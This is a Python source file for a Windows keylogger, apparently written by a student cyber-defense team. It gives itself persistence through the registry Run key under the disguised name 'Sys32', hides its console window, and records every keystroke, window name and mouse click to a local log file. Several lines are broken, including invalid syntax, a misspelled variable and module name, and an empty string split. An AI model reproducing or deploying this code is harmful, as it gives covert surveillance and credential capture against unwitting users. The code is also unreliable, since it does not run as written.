#!/usr/bin/python
# Python Keylogger Tool
# Author: Finn Cappelli
# CDT Team Echo, Spring 2025

import sys
import win32api, pythoncom
import pyHook, os, time, random, smtplib, string, base64
from _winreg import *

global t = ""

try: 
    f = open('log.txt', 'a')
    f.close()
except:
    f = open('log.txt', 'w')
    f.close()

def addStartup(): # add the file to startup registry key
    filepath = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_filepath = file_path + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    keyToChange = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(keyToChange, 'Sys32', 0, REG_SZ, new_filepath)

def hide():
    import win32console
    import win32gui

    win = win32console.GetConsoleWindow()
    wind32gui.ShowWindow(win, 0)

addStartup()
hide()

def OnMouseEvent(event):
    data = '\n[' + str(time.ctime().split('')[3]) + ']' \ + ' WindowName: ' + str(event.WindowName)
    data += '\n\tButton: ' + str(event.MessageName)
    data += '\n\tClicked in (Position):' + str(event.Position) + '\n'

    global t
    t = t + data
    if len(t) > 500:
        f = open('log.txt','a')
        f.write(t)
        f.close()
        t = ''

    return True

def OnKeybEvent(event):
    data = '\n[' + str(time.ctime().split('')[3]) + ']' \ + ' WindowName: ' + str(event.WindowName)
    data += '\n\tKey pressed: ' + str(event.Key) + '\n'

    global t
    t = t + data
    if len(t) > 500:
        f = open('log.txt','a')
        f.write(t)
        f.close()
        t = ''
    return True

hook = pyHook.HookManager()
hook.MouseAllButtonsDown = OnMouseEvent
hook.KeyDown = OnKeybEvent
hook.HookKeyboard()
hook.HookMouse()

pythoncom.PumpMessages()
